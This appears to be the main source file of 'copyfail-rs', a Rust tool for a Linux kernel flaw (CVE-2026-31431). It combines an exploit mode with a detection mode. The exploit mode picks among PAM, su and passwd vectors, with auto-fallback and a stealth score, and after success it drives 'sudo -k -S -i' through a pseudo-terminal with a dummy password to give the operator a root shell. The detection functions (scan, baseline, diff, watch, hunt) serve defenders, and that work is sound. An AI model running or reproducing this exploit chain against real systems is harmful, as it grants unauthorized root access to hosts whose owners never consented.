#![no_std]
#![no_main]

use copyfail_rs::detect::baseline::{diff_baseline, write_baseline};
use copyfail_rs::detect::check::{run_check_with_sources, CheckSources, Verdict};
use copyfail_rs::detect::hunt::run_hunt;
use copyfail_rs::detect::output::{
    check_human, check_json, diff_human, scan_human, scan_json, OUT_BUF,
};
use copyfail_rs::detect::scan::{default_paths, run_scan};
use copyfail_rs::detect::watch::run_watch;
use copyfail_rs::orchestrator::{self, AttemptOutcome, RunReport};
use copyfail_rs::post_exploit::{decide_post_action, PostAction, PAM_BYPASS_HINT};
use copyfail_rs::vectors::{pam::PamVector, passwd::PasswdVector, su::SuVector};
use copyfail_rs::{check_kernel, CopyFail, Error, Vector};
use core::ffi::CStr;
use heapless::String;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    unsafe {
        libc::syscall(libc::SYS_exit_group, 134);
    }
    loop {}
}

#[no_mangle]
pub extern "C" fn rust_eh_personality() {}

const USAGE: &[u8] = b"copyfail-rs (CVE-2026-31431)\n\
Usage:\n\
  copyfail --check\n\
  copyfail --mode exploit [--vector <pam|su|passwd|auto|all|list>] [opts]\n\
  copyfail --mode detect --check [--json]\n\
  copyfail --mode detect --scan [--json] [PATH ...]\n\
  copyfail --mode detect --baseline FILE [PATH ...]\n\
  copyfail --mode detect --diff FILE [--json]\n\
  copyfail --mode detect --watch [--interval SECS]\n\
  copyfail --mode detect --hunt --hosts FILE\n\
  copyfail --help\n\
\n\
Exploit-mode options:\n\
  --vector NAME           pam | su | passwd | auto | all | list (default: auto)\n\
  --dry-run               Print the plan, do not exploit. Exit 0.\n\
  --strict                Exit non-zero if any vector failed, even on success.\n\
  --json                  Emit machine-readable JSON.\n\
  --no-shell              Suppress PAM auto-shell drop; print manual hint.\n\
  --target USER           Reserved for passwd vector (parse-only, deferred).\n\
  --shell PATH            Reserved for shell payload override (parse-only, deferred).\n\
\n\
Authorization & ethics: see README and LICENSE. Run only on systems you own\n\
or have written permission to test.\n";

#[no_mangle]
#[allow(clippy::not_unsafe_ptr_arg_deref)]
pub extern "C" fn main(argc: i32, argv: *const *const u8) -> i32 {
    let args = unsafe { Args::parse(argc, argv) };
    match args.cmd {
        Cmd::Check => run_check(),
        Cmd::Exploit => run_exploit(&args),
        Cmd::Detect => run_detect(&args),
        Cmd::Help => {
            write_stderr(USAGE);
            0
        }
        Cmd::Bad => {
            write_stderr(USAGE);
            2
        }
    }
}

#[derive(Clone, Copy)]
enum Cmd {
    Check,
    Exploit,
    Detect,
    Help,
    Bad,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum VectorChoice {
    None,
    Pam,
    Su,
    Passwd,
    Auto,
    All,
    List,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum DetectSub {
    None,
    Check,
    Scan,
    Baseline,
    Diff,
    Watch,
    Hunt,
}

struct Args {
    cmd: Cmd,
    vector: VectorChoice,
    detect_sub: DetectSub,
    json: bool,
    strict: bool,
    no_shell: bool,
    dry_run: bool,
    interval_secs: u32,
    file_arg: *const u8,
    extra_paths: [*const u8; 32],
    extra_paths_len: usize,
}

impl Args {
    fn empty() -> Args {
        Args {
            cmd: Cmd::Help,
            vector: VectorChoice::None,
            detect_sub: DetectSub::None,
            json: false,
            strict: false,
            no_shell: false,
            dry_run: false,
            interval_secs: 60,
            file_arg: core::ptr::null(),
            extra_paths: [core::ptr::null(); 32],
            extra_paths_len: 0,
        }
    }

    unsafe fn parse(argc: i32, argv: *const *const u8) -> Args {
        let mut a = Args::empty();
        if argc < 2 {
            return a;
        }
        a.cmd = Cmd::Bad;
        let mut i: isize = 1;
        while (i as i32) < argc {
            let arg = *argv.offset(i);
            if cstr_eq(arg, b"--help\0") || cstr_eq(arg, b"-h\0") {
                // --help wins regardless of position. Short-circuit so the
                // post-loop default-vector tail can't fire for an arg list
                // like `--help --mode exploit`.
                a.cmd = Cmd::Help;
                return a;
            } else if cstr_eq(arg, b"--check\0") {
                if matches!(a.cmd, Cmd::Detect) {
                    a.detect_sub = DetectSub::Check;
                } else {
                    a.cmd = Cmd::Check;
                }
            } else if cstr_eq(arg, b"--mode\0") {
                i += 1;
                if (i as i32) >= argc {
                    a.cmd = Cmd::Bad;
                    return a;
                }
                let m = *argv.offset(i);
                if cstr_eq(m, b"exploit\0") {
                    a.cmd = Cmd::Exploit;
                } else if cstr_eq(m, b"detect\0") {
                    a.cmd = Cmd::Detect;
                } else {
                    a.cmd = Cmd::Bad;
                    return a;
                }
            } else if cstr_eq(arg, b"--vector\0") {
                i += 1;
                if (i as i32) >= argc {
                    a.cmd = Cmd::Bad;
                    return a;
                }
                let v = *argv.offset(i);
                a.vector = if cstr_eq(v, b"pam\0") {
                    VectorChoice::Pam
                } else if cstr_eq(v, b"su\0") {
                    VectorChoice::Su
                } else if cstr_eq(v, b"passwd\0") {
                    VectorChoice::Passwd
                } else if cstr_eq(v, b"auto\0") {
                    VectorChoice::Auto
                } else if cstr_eq(v, b"all\0") {
                    VectorChoice::All
                } else if cstr_eq(v, b"list\0") {
                    VectorChoice::List
                } else {
                    a.cmd = Cmd::Bad;
                    return a;
                };
            } else if cstr_eq(arg, b"--scan\0") && matches!(a.cmd, Cmd::Detect) {
                a.detect_sub = DetectSub::Scan;
            } else if cstr_eq(arg, b"--baseline\0") && matches!(a.cmd, Cmd::Detect) {
                a.detect_sub = DetectSub::Baseline;
                i += 1;
                if (i as i32) >= argc {
                    a.cmd = Cmd::Bad;
                    return a;
                }
                a.file_arg = *argv.offset(i);
            } else if cstr_eq(arg, b"--diff\0") && matches!(a.cmd, Cmd::Detect) {
                a.detect_sub = DetectSub::Diff;
                i += 1;
                if (i as i32) >= argc {
                    a.cmd = Cmd::Bad;
                    return a;
                }
                a.file_arg = *argv.offset(i);
            } else if cstr_eq(arg, b"--watch\0") && matches!(a.cmd, Cmd::Detect) {
                a.detect_sub = DetectSub::Watch;
            } else if cstr_eq(arg, b"--hunt\0") && matches!(a.cmd, Cmd::Detect) {
                a.detect_sub = DetectSub::Hunt;
            } else if cstr_eq(arg, b"--hosts\0") {
                i += 1;
                if (i as i32) >= argc {
                    a.cmd = Cmd::Bad;
                    return a;
                }
                a.file_arg = *argv.offset(i);
            } else if cstr_eq(arg, b"--interval\0") {
                i += 1;
                if (i as i32) >= argc {
                    a.cmd = Cmd::Bad;
                    return a;
                }
                a.interval_secs = parse_u32(*argv.offset(i));
            } else if cstr_eq(arg, b"--target\0") {
                // Reserved for passwd vector. Trait does not accept options
                // in S4; consumed here so the flag doesn't fall through to
                // extra_paths and parsing doesn't fail.
                i += 1;
                if (i as i32) >= argc {
                    a.cmd = Cmd::Bad;
                    return a;
                }
            } else if cstr_eq(arg, b"--shell\0") {
                i += 1;
                if (i as i32) >= argc {
                    a.cmd = Cmd::Bad;
                    return a;
                }
            } else if cstr_eq(arg, b"--json\0") {
                a.json = true;
            } else if cstr_eq(arg, b"--strict\0") {
                a.strict = true;
            } else if cstr_eq(arg, b"--no-shell\0") {
                a.no_shell = true;
            } else if cstr_eq(arg, b"--dry-run\0") {
                a.dry_run = true;
            } else if matches!(a.cmd, Cmd::Detect)
                && matches!(a.detect_sub, DetectSub::Scan | DetectSub::Baseline)
                && a.extra_paths_len < a.extra_paths.len()
            {
                a.extra_paths[a.extra_paths_len] = arg;
                a.extra_paths_len += 1;
            }
            i += 1;
        }
        // --mode exploit with no --vector flag defaults to auto. The
        // operator's intent is unambiguous: "exploit this host"; auto-select
        // is the only sensible default. --vector list still requires explicit
        // opt-in (it does not exploit).
        if matches!(a.cmd, Cmd::Exploit) && matches!(a.vector, VectorChoice::None) {
            a.vector = VectorChoice::Auto;
        }
        a
    }
}

unsafe fn cstr_eq(p: *const u8, b: &[u8]) -> bool {
    let mut i = 0;
    loop {
        let c = *p.add(i);
        if i >= b.len() {
            return c == 0 && b.last() == Some(&0);
        }
        if c != b[i] {
            return false;
        }
        if c == 0 && b[i] == 0 {
            return true;
        }
        i += 1;
    }
}

unsafe fn parse_u32(p: *const u8) -> u32 {
    let mut n: u32 = 0;
    let mut i = 0;
    loop {
        let c = *p.add(i);
        if c == 0 {
            break;
        }
        if !c.is_ascii_digit() {
            return 0;
        }
        n = n.saturating_mul(10).saturating_add((c - b'0') as u32);
        i += 1;
    }
    n
}

fn run_check() -> i32 {
    match check_kernel() {
        Ok(s) => {
            write_stderr(b"copyfail-rs --check (foundation facts)\n");
            write_stderr(b"  kernel: ");
            write_stderr(&s.osrelease[..s.osrelease_len]);
            write_stderr(b"\n  algif_aead module:        ");
            write_stderr(if s.algif_aead_module {
                b"present"
            } else {
                b"not in /proc/modules (may be builtin)"
            });
            write_stderr(b"\n  authencesn template:      ");
            write_stderr(if s.authencesn_template {
                b"present in /proc/crypto"
            } else {
                b"NOT present in /proc/crypto"
            });
            write_stderr(
                b"\n  hint:                     run `--mode detect --check` for full verdict\n",
            );
            0
        }
        Err(_) => {
            write_stderr(b"--check: failed to read /proc files\n");
            1
        }
    }
}

// ----- Exploit dispatch ---------------------------------------------------

fn run_exploit(args: &Args) -> i32 {
    // Defensive: parse() sets vector to Auto when --mode exploit is given
    // without --vector. None here means a programming error upstream.
    if matches!(args.vector, VectorChoice::None) {
        write_stderr(b"--mode exploit: vector unresolved (parser bug)\n");
        return 1;
    }

    if matches!(args.vector, VectorChoice::List) {
        return run_list(args);
    }
    if args.dry_run {
        return run_dry_run(args);
    }

    // Kernel-vuln pre-check. Spec: 'host not vulnerable' → exit 3.
    if !host_kernel_appears_vulnerable() {
        write_stderr(b"host kernel does not appear vulnerable to CVE-2026-31431. Aborting.\n");
        return 3;
    }

    match args.vector {
        VectorChoice::Pam => run_named_vector(args, "pam"),
        VectorChoice::Su => run_named_vector(args, "su"),
        VectorChoice::Passwd => run_named_vector(args, "passwd"),
        VectorChoice::Auto => run_auto(args),
        VectorChoice::All => run_all(args),
        // List + None handled by the early returns at the top of this fn.
        VectorChoice::List | VectorChoice::None => {
            write_stderr(b"--mode exploit: dispatch fell through (programmer error)\n");
            1
        }
    }
}

// Quick host-vuln gate. Conservative: require either the algif_aead module
// loaded OR the authencesn template visible in /proc/crypto. Mirrors the
// existing su/passwd applicable() preconditions.
fn host_kernel_appears_vulnerable() -> bool {
    match check_kernel() {
        Ok(s) => s.algif_aead_module || s.authencesn_template,
        Err(_) => false,
    }
}

// ----- --vector list ------------------------------------------------------

fn run_list(args: &Args) -> i32 {
    let pam = PamVector::new();
    let vectors: [&dyn Vector; 3] = [&pam, &SuVector, &PasswdVector];
    let plan = orchestrator::build_plan(&vectors);
    let host_vuln = host_kernel_appears_vulnerable();

    if args.json {
        emit_list_json(&plan, host_vuln);
    } else {
        emit_list_human(&plan, host_vuln);
    }
    0
}

fn emit_list_human(plan: &[orchestrator::PlanEntry], host_vuln: bool) {
    write_stdout(b"Vector applicability on this host:\n\n");
    for e in plan {
        write_stdout(b"  ");
        write_padded(e.name, 10);
        let label: &[u8] = if e.applicable {
            b"APPLICABLE      "
        } else if e.probe_error {
            b"PROBE_ERROR     "
        } else {
            b"NOT APPLICABLE  "
        };
        write_stdout(label);
        write_padded(e.confidence.as_str(), 8);
        write_stdout(e.evidence.as_bytes());
        write_stdout(b"\n");
    }
    write_stdout(b"\nKernel vulnerable: ");
    write_stdout(if host_vuln {
        b"yes"
    } else {
        b"no (run `--mode detect --check` for the full verdict)"
    });
    write_stdout(b"\n");
    // Spec: Recommended order line.
    write_stdout(b"Recommended order (auto): ");
    let mut first = true;
    for e in plan {
        if e.applicable {
            if !first {
                write_stdout(b" \xe2\x86\x92 ");
            }
            write_stdout(e.name.as_bytes());
            first = false;
        }
    }
    if first {
        write_stdout(b"(none applicable)");
    }
    write_stdout(b"\nRun with --vector auto (or `--mode exploit` with no flags) to execute the recommended chain.\n");
}

fn emit_list_json(plan: &[orchestrator::PlanEntry], host_vuln: bool) {
    write_stdout(
        b"{\"mode\":\"exploit\",\"vector_requested\":\"list\",\"host\":{\"kernel_vulnerable\":",
    );
    write_stdout(if host_vuln { b"true" } else { b"false" });
    write_stdout(b"},\"vectors\":[");
    let mut first = true;
    for e in plan {
        if !first {
            write_stdout(b",");
        }
        first = false;
        write_stdout(b"{\"name\":\"");
        write_stdout(e.name.as_bytes());
        write_stdout(b"\",\"stealth\":");
        write_num_u8(e.stealth);
        write_stdout(b",\"confidence\":\"");
        write_stdout(e.confidence.as_str().as_bytes());
        write_stdout(b"\",\"applicable\":");
        write_stdout(if e.applicable { b"true" } else { b"false" });
        write_stdout(b",\"probe_error\":");
        write_stdout(if e.probe_error { b"true" } else { b"false" });
        write_stdout(b",\"evidence\":\"");
        write_stdout(e.evidence.as_bytes());
        write_stdout(b"\"}");
    }
    write_stdout(b"]}\n");
}

// ----- --dry-run ----------------------------------------------------------

fn run_dry_run(args: &Args) -> i32 {
    let pam = PamVector::new();
    let vectors: [&dyn Vector; 3] = [&pam, &SuVector, &PasswdVector];
    let plan = orchestrator::build_plan(&vectors);
    let host_vuln = host_kernel_appears_vulnerable();

    let chosen = plan.iter().find(|e| e.applicable).map(|e| e.name);

    if args.json {
        write_stdout(b"{\"mode\":\"exploit\",\"vector_requested\":\"");
        write_stdout(vector_choice_str(args.vector));
        write_stdout(b"\",\"dry_run\":true,\"host\":{\"kernel_vulnerable\":");
        write_stdout(if host_vuln { b"true" } else { b"false" });
        write_stdout(b"},\"would_execute\":");
        match chosen {
            Some(n) => {
                write_stdout(b"\"");
                write_stdout(n.as_bytes());
                write_stdout(b"\"");
            }
            None => write_stdout(b"null"),
        }
        write_stdout(b"}\n");
    } else {
        write_stdout(b"[dry-run] requested vector: ");
        write_stdout(vector_choice_str(args.vector));
        write_stdout(b"\n[dry-run] kernel vulnerable: ");
        write_stdout(if host_vuln { b"yes\n" } else { b"no\n" });
        match chosen {
            Some(n) => {
                write_stdout(b"[dry-run] would execute: ");
                write_stdout(n.as_bytes());
                write_stdout(b"\n");
            }
            None => write_stdout(b"[dry-run] no applicable vector on this host\n"),
        }
    }
    0
}

fn vector_choice_str(v: VectorChoice) -> &'static [u8] {
    match v {
        VectorChoice::Pam => b"pam",
        VectorChoice::Su => b"su",
        VectorChoice::Passwd => b"passwd",
        VectorChoice::Auto => b"auto",
        VectorChoice::All => b"all",
        VectorChoice::List => b"list",
        VectorChoice::None => b"none",
    }
}

// ----- --vector <name> (single) ------------------------------------------

fn run_named_vector(args: &Args, name: &str) -> i32 {
    let pam = PamVector::new();
    let v: &dyn Vector = match name {
        "pam" => &pam,
        "su" => &SuVector,
        "passwd" => &PasswdVector,
        _ => return 2,
    };
    match v.applicable() {
        Ok(true) => {}
        Ok(false) => {
            write_stderr(name.as_bytes());
            write_stderr(b": not applicable on this host\n");
            return 4;
        }
        Err(_) => {
            write_stderr(name.as_bytes());
            write_stderr(b": applicability probe failed\n");
            return 4;
        }
    }
    let mut prim = match CopyFail::new() {
        Ok(p) => p,
        Err(_) => {
            write_stderr(b"CopyFail::new failed (kernel mitigated?)\n");
            return 1;
        }
    };
    write_stderr(b"[+] running vector: ");
    write_stderr(name.as_bytes());
    write_stderr(b"\n");
    match v.execute(&mut prim) {
        Ok(()) => {
            // PAM vector returns Ok on success without execve. SU/passwd
            // execve on success and never reach here; if they returned Ok,
            // something is wrong, but we still attempt the post-exploit
            // dispatch shaped for PAM.
            post_exploit_dispatch(args, name)
        }
        Err(_) => {
            write_stderr(name.as_bytes());
            write_stderr(b": execute failed\n");
            1
        }
    }
}

// ----- --vector auto ------------------------------------------------------

fn run_auto(args: &Args) -> i32 {
    let pam = PamVector::new();
    let vectors: [&dyn Vector; 3] = [&pam, &SuVector, &PasswdVector];
    let chosen_idx = match orchestrator::select_vector(&vectors) {
        Some(i) => i,
        None => {
            write_stderr(b"--vector auto: no applicable vector on this host\n");
            return 4;
        }
    };
    let chosen = vectors[chosen_idx];
    let name = chosen.name();
    write_stderr(b"[+] auto-selected vector: ");
    write_stderr(name.as_bytes());
    write_stderr(b"\n");

    let mut prim = match CopyFail::new() {
        Ok(p) => p,
        Err(_) => {
            write_stderr(b"CopyFail::new failed (kernel mitigated?)\n");
            return 1;
        }
    };

    match chosen.execute(&mut prim) {
        Ok(()) => post_exploit_dispatch(args, name),
        Err(_) => {
            // Auto-mode fallback: try the next applicable vector. This is
            // distinct from --vector all because auto only re-tries on
            // execute failure (not applicability mismatch).
            write_stderr(b"[-] ");
            write_stderr(name.as_bytes());
            write_stderr(b": execute failed, attempting fallback\n");
            run_all(args)
        }
    }
}

// ----- --vector all -------------------------------------------------------

fn run_all(args: &Args) -> i32 {
    let pam = PamVector::new();
    let vectors: [&dyn Vector; 3] = [&pam, &SuVector, &PasswdVector];

    let mut prim = match CopyFail::new() {
        Ok(p) => p,
        Err(_) => {
            write_stderr(b"CopyFail::new failed (kernel mitigated?)\n");
            return 1;
        }
    };

    let report = orchestrator::try_all_with(&vectors, |v| {
        write_stderr(b"[+] trying vector: ");
        write_stderr(v.name().as_bytes());
        write_stderr(b"\n");
        v.execute(&mut prim)
    });

    if args.json {
        emit_run_json(args, &report);
    }

    let exit = orchestrator::exit_code_for(&report, args.strict);

    match report.success {
        Some(name) if exit == 0 || exit == 5 => {
            // Success path. PAM bypass needs post-exploit shell drop;
            // SU/passwd execve and never reach here on real success.
            // exit 5 only happens with --strict + prior failure: still
            // drop the shell so the operator gets the bypass, then exit 5.
            let post_exit = post_exploit_dispatch(args, name);
            if exit == 5 {
                5
            } else {
                post_exit
            }
        }
        _ => {
            if !args.json {
                write_stderr(b"[-] all applicable vectors failed\n");
            }
            exit
        }
    }
}

fn emit_run_json(args: &Args, report: &RunReport) {
    write_stdout(b"{\"mode\":\"exploit\",\"vector_requested\":\"");
    write_stdout(vector_choice_str(args.vector));
    write_stdout(b"\",\"vector_used\":");
    match report.success {
        Some(n) => {
            write_stdout(b"\"");
            write_stdout(n.as_bytes());
            write_stdout(b"\"");
        }
        None => write_stdout(b"null"),
    }
    write_stdout(b",\"outcome\":\"");
    write_stdout(if report.success.is_some() {
        b"success"
    } else {
        b"failure"
    });
    write_stdout(b"\",\"fallback_chain\":[");
    let mut first = true;
    for a in report.attempts.iter() {
        if !first {
            write_stdout(b",");
        }
        first = false;
        write_stdout(b"{\"name\":\"");
        write_stdout(a.name.as_bytes());
        write_stdout(b"\",\"outcome\":\"");
        let o: &[u8] = match a.outcome {
            AttemptOutcome::Skipped => b"skipped",
            AttemptOutcome::ProbeError => b"probe_error",
            AttemptOutcome::ExecuteOk => b"success",
            AttemptOutcome::ExecuteErr => b"failure",
        };
        write_stdout(o);
        write_stdout(b"\"}");
    }
    write_stdout(b"]}\n");
}

// ----- Post-exploit dispatch (shared with PAM single-vector path) --------

fn post_exploit_dispatch(args: &Args, vector_name: &str) -> i32 {
    let stdin_is_tty = unsafe { libc::isatty(0) } == 1;
    match decide_post_action(args.json, args.no_shell, stdin_is_tty) {
        PostAction::DropShell => {
            if vector_name == "pam" {
                drop_root_shell_via_sudo()
            } else {
                // SU/passwd: control should already be in execve'd shell.
                // Reaching here means execute returned Ok unexpectedly.
                0
            }
        }
        PostAction::PrintHint => {
            write_stderr(vector_name.as_bytes());
            write_stderr(b": bypass active. To get a root shell: ");
            write_stderr(PAM_BYPASS_HINT);
            write_stderr(b"\n");
            0
        }
        PostAction::EmitJson => {
            // Minimal JSON for single-vector path. --vector all already
            // emitted its own structured JSON.
            if !matches!(args.vector, VectorChoice::All) {
                write_stdout(b"{\"vector\":\"");
                write_stdout(vector_name.as_bytes());
                write_stdout(b"\",\"outcome\":\"success\",\"bypass_active\":true,\"hint\":\"");
                write_stdout(PAM_BYPASS_HINT);
                write_stdout(b"\"}\n");
            }
            0
        }
    }
}

// ----- PTY drop-into-root-shell (unchanged from S2.7) --------------------

fn drop_root_shell_via_sudo() -> i32 {
    let mut orig_termios: libc::termios = unsafe { core::mem::zeroed() };
    let saved = unsafe { libc::tcgetattr(0, &mut orig_termios) } == 0;

    let master = unsafe { libc::open(c"/dev/ptmx".as_ptr(), libc::O_RDWR | libc::O_NOCTTY) };
    if master < 0 {
        write_stderr(b"pam: open(/dev/ptmx) failed\n");
        return 1;
    }
    if unsafe { libc::grantpt(master) } != 0 || unsafe { libc::unlockpt(master) } != 0 {
        unsafe {
            libc::close(master);
        }
        write_stderr(b"pam: grantpt/unlockpt failed\n");
        return 1;
    }

    let mut slave_name = [0u8; 128];
    if unsafe { libc::ptsname_r(master, slave_name.as_mut_ptr() as *mut _, slave_name.len()) } != 0
    {
        unsafe {
            libc::close(master);
        }
        write_stderr(b"pam: ptsname_r failed\n");
        return 1;
    }

    let pid = unsafe { libc::fork() };
    if pid < 0 {
        unsafe {
            libc::close(master);
        }
        write_stderr(b"pam: fork failed\n");
        return 1;
    }

    if pid == 0 {
        unsafe {
            libc::close(master);
            libc::setsid();
            let slave = libc::open(slave_name.as_ptr() as *const _, libc::O_RDWR);
            if slave < 0 {
                libc::syscall(libc::SYS_exit_group, 1);
                core::hint::unreachable_unchecked()
            }
            libc::ioctl(slave, libc::TIOCSCTTY, 0);
            libc::dup2(slave, 0);
            libc::dup2(slave, 1);
            libc::dup2(slave, 2);
            if slave > 2 {
                libc::close(slave);
            }
            libc::syscall(libc::SYS_close_range, 3u32, !0u32, 0u32);
            let path = b"/usr/bin/sudo\0";
            let arg0 = b"sudo\0";
            let arg1 = b"-k\0";
            let arg2 = b"-S\0";
            let arg3 = b"-i\0";
            let argv: [*const u8; 5] = [
                arg0.as_ptr(),
                arg1.as_ptr(),
                arg2.as_ptr(),
                arg3.as_ptr(),
                core::ptr::null(),
            ];
            libc::execv(path.as_ptr() as *const _, argv.as_ptr() as *const *const _);
            libc::syscall(libc::SYS_exit_group, 127);
            core::hint::unreachable_unchecked()
        }
    }

    if saved {
        let mut raw = orig_termios;
        unsafe {
            libc::cfmakeraw(&mut raw);
        }
        unsafe {
            libc::tcsetattr(0, libc::TCSANOW, &raw);
        }
    }

    let pw = b"any\n";
    unsafe {
        libc::write(master, pw.as_ptr() as *const _, pw.len());
    }

    let mut fds = [
        libc::pollfd {
            fd: 0,
            events: libc::POLLIN,
            revents: 0,
        },
        libc::pollfd {
            fd: master,
            events: libc::POLLIN,
            revents: 0,
        },
    ];
    let mut buf = [0u8; 4096];
    'relay: loop {
        let r = unsafe { libc::poll(fds.as_mut_ptr(), 2, -1) };
        if r < 0 {
            let e = unsafe { *libc::__errno_location() };
            if e == libc::EINTR {
                continue;
            }
            break;
        }
        if fds[0].revents & (libc::POLLIN | libc::POLLHUP) != 0 {
            let n = unsafe { libc::read(0, buf.as_mut_ptr() as *mut _, buf.len()) };
            if n > 0 {
                let mut off = 0usize;
                while off < n as usize {
                    let w = unsafe {
                        libc::write(master, buf.as_ptr().add(off) as *const _, n as usize - off)
                    };
                    if w <= 0 {
                        break 'relay;
                    }
                    off += w as usize;
                }
            } else {
                fds[0].fd = -1;
            }
        }
        if fds[1].revents & libc::POLLIN != 0 {
            let n = unsafe { libc::read(master, buf.as_mut_ptr() as *mut _, buf.len()) };
            if n > 0 {
                let mut off = 0usize;
                while off < n as usize {
                    let w = unsafe {
                        libc::write(1, buf.as_ptr().add(off) as *const _, n as usize - off)
                    };
                    if w <= 0 {
                        break 'relay;
                    }
                    off += w as usize;
                }
            } else {
                break;
            }
        }
        if fds[1].revents & (libc::POLLHUP | libc::POLLERR) != 0 {
            loop {
                let n = unsafe { libc::read(master, buf.as_mut_ptr() as *mut _, buf.len()) };
                if n <= 0 {
                    break;
                }
                let mut off = 0usize;
                while off < n as usize {
                    let w = unsafe {
                        libc::write(1, buf.as_ptr().add(off) as *const _, n as usize - off)
                    };
                    if w <= 0 {
                        break;
                    }
                    off += w as usize;
                }
            }
            break;
        }
    }

    let mut status: i32 = 0;
    unsafe {
        libc::waitpid(pid, &mut status, 0);
    }

    if saved {
        unsafe {
            libc::tcsetattr(0, libc::TCSANOW, &orig_termios);
        }
    }
    unsafe {
        libc::close(master);
    }

    if libc::WIFEXITED(status) {
        libc::WEXITSTATUS(status)
    } else {
        1
    }
}

// ----- Detect mode (unchanged) -------------------------------------------

fn run_detect(args: &Args) -> i32 {
    match args.detect_sub {
        DetectSub::Check => detect_check(args.json, args.strict),
        DetectSub::Scan => detect_scan(args),
        DetectSub::Baseline => detect_baseline(args),
        DetectSub::Diff => detect_diff(args),
        DetectSub::Watch => detect_watch(args),
        DetectSub::Hunt => detect_hunt(args),
        DetectSub::None => {
            write_stderr(USAGE);
            2
        }
    }
}

fn detect_check(json: bool, strict: bool) -> i32 {
    let kr = match check_kernel() {
        Ok(k) => k,
        Err(_) => return 1,
    };
    let mut path_buf: [u8; 192] = [0u8; 192];
    let prefix = b"/boot/config-";
    let kernel = &kr.osrelease[..kr.osrelease_len];
    if prefix.len() + kernel.len() + 1 > path_buf.len() {
        return 1;
    }
    path_buf[..prefix.len()].copy_from_slice(prefix);
    path_buf[prefix.len()..prefix.len() + kernel.len()].copy_from_slice(kernel);
    let boot_cstr = match CStr::from_bytes_until_nul(&path_buf) {
        Ok(c) => c,
        Err(_) => return 1,
    };

    let sources = CheckSources {
        proc_modules: c"/proc/modules",
        proc_crypto: c"/proc/crypto",
        boot_config: boot_cstr,
        modprobe_d_dir: c"/etc/modprobe.d",
        osrelease: c"/proc/sys/kernel/osrelease",
    };
    let report = match run_check_with_sources(&sources) {
        Ok(r) => r,
        Err(_) => return 1,
    };

    let mut out: String<OUT_BUF> = String::new();
    if json {
        check_json(&report, &mut out);
    } else {
        check_human(&report, &mut out);
    }
    write_stdout(out.as_bytes());

    if strict && matches!(report.verdict, Verdict::Vulnerable) {
        4
    } else {
        0
    }
}

fn detect_scan(args: &Args) -> i32 {
    let mut paths: heapless::Vec<&CStr, 64> = heapless::Vec::new();

    if args.extra_paths_len > 0 {
        for i in 0..args.extra_paths_len {
            unsafe {
                let cstr = CStr::from_ptr(args.extra_paths[i] as *const _);
                let _ = paths.push(cstr);
            }
        }
    } else {
        for cstr in default_paths().iter() {
            let _ = paths.push(*cstr);
        }
    }

    let report = match run_scan(&paths) {
        Ok(r) => r,
        Err(_) => return 1,
    };

    let mut out: String<OUT_BUF> = String::new();
    if args.json {
        scan_json(&report, &mut out);
    } else {
        scan_human(&report, &mut out);
    }
    write_stdout(out.as_bytes());

    if args.strict && report.any_tampered() {
        4
    } else {
        0
    }
}

fn detect_baseline(args: &Args) -> i32 {
    if args.file_arg.is_null() {
        write_stderr(USAGE);
        return 2;
    }
    let out_cstr = unsafe { CStr::from_ptr(args.file_arg as *const _) };

    let mut paths: heapless::Vec<&CStr, 64> = heapless::Vec::new();
    if args.extra_paths_len > 0 {
        for i in 0..args.extra_paths_len {
            unsafe {
                let cstr = CStr::from_ptr(args.extra_paths[i] as *const _);
                let _ = paths.push(cstr);
            }
        }
    } else {
        for cstr in default_paths().iter() {
            let _ = paths.push(*cstr);
        }
    }

    match write_baseline(out_cstr, &paths) {
        Ok(n) => {
            write_stderr(b"baseline written: ");
            write_num(n);
            write_stderr(b" entries\n");
            0
        }
        Err(_) => {
            write_stderr(b"baseline: write failed\n");
            1
        }
    }
}

fn detect_diff(args: &Args) -> i32 {
    if args.file_arg.is_null() {
        write_stderr(USAGE);
        return 2;
    }
    let in_cstr = unsafe { CStr::from_ptr(args.file_arg as *const _) };
    match diff_baseline(in_cstr) {
        Ok(diffs) => {
            let mut out: String<OUT_BUF> = String::new();
            diff_human(&diffs, &mut out);
            write_stdout(out.as_bytes());
            if args.strict && !diffs.is_empty() {
                4
            } else {
                0
            }
        }
        Err(_) => 1,
    }
}

fn detect_watch(args: &Args) -> i32 {
    let mut paths: heapless::Vec<&CStr, 64> = heapless::Vec::new();
    for cstr in default_paths().iter() {
        let _ = paths.push(*cstr);
    }
    let interval = if args.interval_secs == 0 {
        60
    } else {
        args.interval_secs
    };
    match run_watch(&paths, interval) {
        Ok(_) => 0,
        Err(_) => 1,
    }
}

fn detect_hunt(args: &Args) -> i32 {
    if args.file_arg.is_null() {
        write_stderr(USAGE);
        return 2;
    }
    let cstr = unsafe { CStr::from_ptr(args.file_arg as *const _) };
    match run_hunt(cstr) {
        Ok(_) => 0,
        Err(_) => 1,
    }
}

// ----- Output helpers -----------------------------------------------------

#[allow(dead_code)]
fn err_code(_e: Error) -> i32 {
    1
}

fn write_stderr(b: &[u8]) {
    unsafe {
        libc::write(2, b.as_ptr() as *const _, b.len());
    }
}

fn write_stdout(b: &[u8]) {
    unsafe {
        libc::write(1, b.as_ptr() as *const _, b.len());
    }
}

fn write_num(n: usize) {
    let mut buf = [0u8; 32];
    let mut i = buf.len();
    let mut v = n;
    if v == 0 {
        i -= 1;
        buf[i] = b'0';
    } else {
        while v > 0 {
            i -= 1;
            buf[i] = b'0' + (v % 10) as u8;
            v /= 10;
        }
    }
    write_stderr(&buf[i..]);
}

fn write_num_u8(n: u8) {
    let mut buf = [0u8; 4];
    let mut i = buf.len();
    let mut v = n as usize;
    if v == 0 {
        i -= 1;
        buf[i] = b'0';
    } else {
        while v > 0 {
            i -= 1;
            buf[i] = b'0' + (v % 10) as u8;
            v /= 10;
        }
    }
    write_stdout(&buf[i..]);
}

fn write_padded(s: &str, width: usize) {
    write_stdout(s.as_bytes());
    if s.len() < width {
        let pad = width - s.len();
        let spaces = b"                ";
        let mut left = pad;
        while left > 0 {
            let n = core::cmp::min(left, spaces.len());
            write_stdout(&spaces[..n]);
            left -= n;
        }
    }
}
